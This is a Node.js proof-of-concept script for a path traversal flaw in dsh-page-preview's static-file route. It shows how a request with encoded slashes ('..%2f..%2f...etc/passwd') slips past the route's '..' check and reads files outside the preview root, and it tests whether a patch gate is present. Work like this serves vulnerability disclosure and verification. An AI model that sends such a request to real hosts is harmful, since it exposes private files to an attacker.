// PoC: path traversal in dsh-page-preview's static-file route.
//
// Self-contained. It pulls the ACTUAL route helpers out of the installed
// lib/index.js (no re-implementation), reproduces exactly what the route does
// with req.url, and shows that a %2f-smuggled ".." escapes the registered
// rootDir. Run:  node poc-traversal.mjs /path/to/lib/index.js
import { readFileSync } from 'node:fs'
import { resolve as osResolve } from 'node:path'

const libPath = process.argv[2] ?? new URL('./upstream-index.js', import.meta.url).pathname
const src = readFileSync(libPath, 'utf8')

// Lift the exact helpers the route uses, with a shared scope so join→toPosix
// (and, if present in a patched build, isWithin→normalizePosix) resolve.
function slice(name) {
  const start = src.indexOf(`function ${name}(`)
  if (start < 0) return ''
  let depth = 0
  for (let j = src.indexOf('{', start); j < src.length; j++) {
    if (src[j] === '{') depth++
    else if (src[j] === '}') { depth--; if (depth === 0) return src.slice(start, j + 1) }
  }
  return ''
}
const body = ['toPosix', 'join', 'normalizePosix', 'isWithin'].map(slice).filter(Boolean).join('\n')
// eslint-disable-next-line no-new-func
const helpers = new Function(`${body}\nreturn { join, isWithin: typeof isWithin === 'function' ? isWithin : null }`)()
const { join, isWithin } = helpers

// The route's own parseRoutePath, verbatim in behaviour (decode-then-check).
function parseRoutePath(url, route) {
  const raw = String(url || '/'); const q = raw.indexOf('?')
  const pathname = q < 0 ? raw : raw.slice(0, q)
  if (pathname === route) return []
  if (!pathname.startsWith(route + '/')) return null
  const parts = []
  for (const rawSeg of pathname.slice(route.length + 1).split('/')) {
    if (rawSeg === '') continue
    let seg
    try { seg = decodeURIComponent(rawSeg) } catch { return null }
    if (seg === '..' || seg === '.' || seg.indexOf('\\') >= 0 || seg.indexOf('\0') >= 0) return null
    parts.push(seg)
  }
  return parts
}

const ROUTE = '/dsh-page-preview/fs'
const rootDir = '/home/victim/project'   // a registered preview's root
const entryFile = 'index.html'

// The exact request an attacker (or a malicious page in the loopback origin)
// sends. %2f is a URL-encoded slash: decodeURIComponent turns "..%2f..%2f"
// into "../../" INSIDE ONE segment, so `seg === '..'` never matches.
const attack = `${ROUTE}/TOKEN/..%2f..%2f..%2f..%2f..%2fetc/passwd`

const parts = parseRoutePath(attack, ROUTE)
const rel = parts === null ? null : parts.slice(1).join('/')
const filePath = rel === null ? null : (rel === '' || rel === entryFile ? join(rootDir, entryFile) : join(rootDir, rel))

// This mirrors the route: it serves filePath (a patched build adds an isWithin
// gate first; an unpatched build does not). The judge on whether it escapes
// must use the OS-CANONICAL path — the kernel folds ".." away when it opens the
// file, so the raw string still starting with rootDir is irrelevant.
const gated = typeof isWithin === 'function' ? (filePath !== null && !isWithin(rootDir, filePath)) : false
const canonical = filePath === null ? null : osResolve(filePath)
const escapes = canonical !== null && !canonical.startsWith(rootDir + '/') && canonical !== rootDir

console.log('request path   :', attack)
console.log('parsed segs    :', JSON.stringify(parts))
console.log('route filePath :', filePath)
console.log('OS reads (real):', canonical)
console.log('escapes root   :', escapes)
console.log('isWithin gate  :', typeof isWithin === 'function' ? (gated ? 'REJECTS (patched)' : 'allows') : 'absent (unpatched)')
if (escapes && !gated) {
  console.log('\n*** VULNERABLE: the OS opens', canonical, '— outside', rootDir)
  console.log('    DSH fs-sandbox contains writes, not reads → arbitrary host-file read.')
  process.exit(2)
}
console.log('\nSAFE: traversal is contained (gate rejects it, or it never escapes).')
process.exit(0)
